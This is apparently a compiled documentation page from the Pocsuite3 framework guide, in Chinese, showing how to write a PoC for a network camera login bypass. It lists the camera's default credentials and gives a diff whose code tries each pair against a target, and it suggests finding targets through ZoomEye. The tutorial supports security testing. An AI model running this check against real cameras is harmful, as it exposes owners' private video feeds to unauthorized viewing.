import{_ as s}from"./chunks/poc-demo-camera-auth-bypass_verify.e8d89554.js";import{_ as a,j as n,g as p,H as l}from"./chunks/framework.8815fd6f.js";const A=JSON.parse('{"title":"\u67D0\u7F51\u7EDC\u6444\u50CF\u5934\u767B\u5F55\u7ED5\u8FC7\u6F0F\u6D1E","description":"","frontmatter":{},"headers":[{"level":2,"title":"PoC \u5F00\u53D1","slug":"poc-\u5F00\u53D1"},{"level":2,"title":"\u6F0F\u6D1E\u9A8C\u8BC1","slug":"\u6F0F\u6D1E\u9A8C\u8BC1"}],"relativePath":"guide/poc-demo-camera-auth-bypass.md","lastUpdated":1658173066000}'),e={name:"guide/poc-demo-camera-auth-bypass.md"},o=l(`<h1 id="\u67D0\u7F51\u7EDC\u6444\u50CF\u5934\u767B\u5F55\u7ED5\u8FC7\u6F0F\u6D1E" tabindex="-1">\u67D0\u7F51\u7EDC\u6444\u50CF\u5934\u767B\u5F55\u7ED5\u8FC7\u6F0F\u6D1E <a class="header-anchor" href="#\u67D0\u7F51\u7EDC\u6444\u50CF\u5934\u767B\u5F55\u7ED5\u8FC7\u6F0F\u6D1E" aria-hidden="true">#</a></h1><p>\u6F0F\u6D1E\u7EC6\u8282\uFF1A<a href="https://paper.seebug.org/653/" target="_blank" rel="noreferrer">\u67D0\u7F51\u7EDC\u6444\u50CF\u5934\u767B\u5F55\u7ED5\u8FC7\u53CA\u591A\u4E2A\u57FA\u4E8E\u5806\u6808\u6EA2\u51FA\u7684\u8FDC\u7A0B\u4EE3\u7801\u6267\u884C\u6F0F\u6D1E\u53CA\u6570\u636E\u5206\u6790\u62A5\u544A</a></p><p>\u8BE5\u54C1\u724C\u6444\u50CF\u5934\u7684 Web \u670D\u52A1\u57FA\u4E8E HTTP \u57FA\u672C\u8BA4\u8BC1\uFF0C\u5B58\u5728\u4E09\u7EC4\u9ED8\u8BA4\u51ED\u8BC1\uFF0C\u5206\u522B\u5BF9\u5E94\u4E0D\u540C\u7684\u6743\u9650\u7B49\u7EA7\u3002\u4E09\u7EC4\u9ED8\u8BA4\u51ED\u8BC1\u5206\u522B\u4E3A\uFF1A<code>admin:admin</code>\uFF0C<code>user:user</code>\uFF0C<code>guest:guest</code>\uFF0C\u5B89\u88C5\u65F6 APP \u53EA\u4F1A\u63D0\u9192\u4FEE\u6539 admin \u8D26\u6237\u7684\u9ED8\u8BA4\u5BC6\u7801\u3002</p><p>\u503C\u5F97\u4E00\u63D0\u7684\u662F\uFF0Cuser \u8D26\u6237\u548C guest \u8D26\u6237\u4E5F\u53EF\u4EE5\u67E5\u770B\u89C6\u9891\u6D41\uFF0C\u5927\u90E8\u5206\u7528\u6237\u4E0D\u4F1A\u4FEE\u6539\u8FD9\u4E9B\u8D26\u6237\u7684\u9ED8\u8BA4\u5BC6\u7801\uFF0C\u5BFC\u81F4\u9690\u79C1\u6CC4\u6F0F\u3002</p><h2 id="poc-\u5F00\u53D1" tabindex="-1">PoC \u5F00\u53D1 <a class="header-anchor" href="#poc-\u5F00\u53D1" aria-hidden="true">#</a></h2><p>\u751F\u6210\u6A21\u7248\uFF0C</p><div class="language-bash"><span class="copy"></span><pre><code><span class="line"><span style="color:#A6ACCD;">\u279C pocsuite --new</span></span>
<span class="line"><span style="color:#A6ACCD;">...</span></span>
<span class="line"><span style="color:#A6ACCD;">0    Arbitrary File Read</span></span>
<span class="line"><span style="color:#A6ACCD;">1    Code Execution</span></span>
<span class="line"><span style="color:#A6ACCD;">2    Command Execution</span></span>
<span class="line"><span style="color:#A6ACCD;">3    Denial Of service</span></span>
<span class="line"><span style="color:#A6ACCD;">4    Information Disclosure</span></span>
<span class="line"><span style="color:#A6ACCD;">5    Login Bypass</span></span>
<span class="line"><span style="color:#A6ACCD;">6    Path Traversal</span></span>
<span class="line"><span style="color:#A6ACCD;">7    SQL Injection</span></span>
<span class="line"><span style="color:#A6ACCD;">8    SSRF</span></span>
<span class="line"><span style="color:#A6ACCD;">9    XSS</span></span>
<span class="line"></span>
<span class="line"><span style="color:#A6ACCD;">Vulnerability type, choose from above or provide </span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">eg, 3</span><span style="color:#89DDFF;">)</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">[]</span><span style="color:#A6ACCD;">: 5</span></span>
<span class="line"><span style="color:#A6ACCD;">...</span></span>
<span class="line"></span></code></pre></div><p>\u4FEE\u6539\u6A21\u7248\uFF1A</p><div class="language-diff"><span class="copy"></span><pre><code><span class="line"></span>
<span class="line"><span style="color:#89DDFF;">-</span><span style="color:#F07178;">    def _options(self):</span></span>
<span class="line"><span style="color:#89DDFF;">-</span><span style="color:#F07178;">        o = OrderedDict()</span></span>
<span class="line"><span style="color:#89DDFF;">-</span><span style="color:#F07178;">        o[&#39;param&#39;] = OptString(&#39;&#39;, description=&#39;The param&#39;)</span></span>
<span class="line"><span style="color:#89DDFF;">-</span><span style="color:#F07178;">        return o</span></span>
<span class="line"><span style="color:#89DDFF;">-</span></span>
<span class="line"><span style="color:#A6ACCD;">     def _exploit(self, param=&#39;&#39;):</span></span>
<span class="line"><span style="color:#89DDFF;">-</span><span style="color:#F07178;">        if not self._check(dork=&#39;&#39;):</span></span>
<span class="line"><span style="color:#89DDFF;">+</span><span style="color:#C3E88D;">        if not self._check(dork=&#39;Error: username or password error,please input again.&#39;):</span></span>
<span class="line"><span style="color:#A6ACCD;">             return False</span></span>
<span class="line"></span>
<span class="line"><span style="color:#89DDFF;">-</span><span style="color:#F07178;">        headers = {&#39;Content-Type&#39;: &#39;application/x-www-form-urlencoded&#39;}</span></span>
<span class="line"><span style="color:#89DDFF;">-</span><span style="color:#F07178;">        payload = &#39;a=b&#39;</span></span>
<span class="line"><span style="color:#89DDFF;">-</span><span style="color:#F07178;">        res = requests.post(self.url, headers=headers, data=payload)</span></span>
<span class="line"><span style="color:#89DDFF;">-</span><span style="color:#F07178;">        logger.debug(res.text)</span></span>
<span class="line"><span style="color:#89DDFF;">-</span><span style="color:#F07178;">        return res.text</span></span>
<span class="line"><span style="color:#89DDFF;">+</span><span style="color:#C3E88D;">        creds = {&#39;admin&#39;: &#39;admin&#39;, &#39;user&#39;: &#39;user&#39;, &#39;guest&#39;: &#39;guest&#39;}</span></span>
<span class="line"><span style="color:#89DDFF;">+</span><span style="color:#C3E88D;">        valid_creds = {}</span></span>
<span class="line"><span style="color:#89DDFF;">+</span><span style="color:#C3E88D;">        for u, p in creds.items():</span></span>
<span class="line"><span style="color:#89DDFF;">+</span><span style="color:#C3E88D;">            res = requests.get(self.url, auth=(u, p))</span></span>
<span class="line"><span style="color:#89DDFF;">+</span><span style="color:#C3E88D;">            if res.status_code != 401:</span></span>
<span class="line"><span style="color:#89DDFF;">+</span><span style="color:#C3E88D;">                valid_creds[u] = p</span></span>
<span class="line"><span style="color:#89DDFF;">+</span><span style="color:#C3E88D;">        return valid_creds</span></span>
<span class="line"></span>
<span class="line"><span style="color:#A6ACCD;">     def _verify(self):</span></span>
<span class="line"><span style="color:#A6ACCD;">         result = {}</span></span>
<span class="line"><span style="color:#89DDFF;">@@</span><span style="color:#A6ACCD;"> -53,17 +48,11 </span><span style="color:#89DDFF;">@@</span><span style="color:#A6ACCD;"> class DemoPOC(POCBase):</span></span>
<span class="line"><span style="color:#A6ACCD;">         if res:</span></span>
<span class="line"><span style="color:#A6ACCD;">             result[&#39;VerifyInfo&#39;] = {}</span></span>
<span class="line"><span style="color:#A6ACCD;">             result[&#39;VerifyInfo&#39;][&#39;URL&#39;] = self.url</span></span>
<span class="line"><span style="color:#89DDFF;">-</span><span style="color:#F07178;">            result[&#39;VerifyInfo&#39;][param] = res</span></span>
<span class="line"><span style="color:#89DDFF;">+</span><span style="color:#C3E88D;">            result[&#39;VerifyInfo&#39;][&#39;Info&#39;] = res</span></span>
<span class="line"><span style="color:#A6ACCD;">         return self.parse_output(result)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#A6ACCD;">     def _attack(self):</span></span>
<span class="line"><span style="color:#89DDFF;">-</span><span style="color:#F07178;">        result = {}</span></span>
<span class="line"><span style="color:#89DDFF;">-</span><span style="color:#F07178;">        param = self.get_option(&#39;param&#39;)</span></span>
<span class="line"><span style="color:#89DDFF;">-</span><span style="color:#F07178;">        res = self._exploit(param)</span></span>
<span class="line"><span style="color:#89DDFF;">-</span><span style="color:#F07178;">        result[&#39;VerifyInfo&#39;] = {}</span></span>
<span class="line"><span style="color:#89DDFF;">-</span><span style="color:#F07178;">        result[&#39;VerifyInfo&#39;][&#39;URL&#39;] = self.url</span></span>
<span class="line"><span style="color:#89DDFF;">-</span><span style="color:#F07178;">        result[&#39;VerifyInfo&#39;][param] = res</span></span>
<span class="line"><span style="color:#89DDFF;">-</span><span style="color:#F07178;">        return self.parse_output(result)</span></span>
<span class="line"><span style="color:#89DDFF;">+</span><span style="color:#C3E88D;">        return self._verify()</span></span>
<span class="line"></span>
<span class="line"></span></code></pre></div><h2 id="\u6F0F\u6D1E\u9A8C\u8BC1" tabindex="-1">\u6F0F\u6D1E\u9A8C\u8BC1 <a class="header-anchor" href="#\u6F0F\u6D1E\u9A8C\u8BC1" aria-hidden="true">#</a></h2><p>\u4F7F\u7528 <code>--dork-zoomeye</code> \u6307\u5B9A\u5173\u952E\u8BCD\u4ECE ZoomEye \u68C0\u7D22\u76EE\u6807\u8FDB\u884C\u68C0\u6D4B\u3002</p><p><img src="`+s+'" alt=""></p>',12),r=[o];function c(t,i,y,D,F,d){return p(),n("div",null,r)}var f=a(e,[["render",c]]);export{A as __pageData,f as default};
